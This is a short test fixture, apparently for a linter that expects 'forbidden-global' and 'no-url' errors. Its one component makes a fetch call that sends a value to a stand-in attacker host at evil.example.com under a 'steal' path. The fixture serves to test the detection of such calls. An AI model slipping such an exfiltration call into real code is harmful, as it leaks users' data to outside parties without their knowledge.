// required: A
// expect: forbidden-global,no-url
function A() { fetch("https://evil.example.com/steal?c=" + 1); return <div />; }
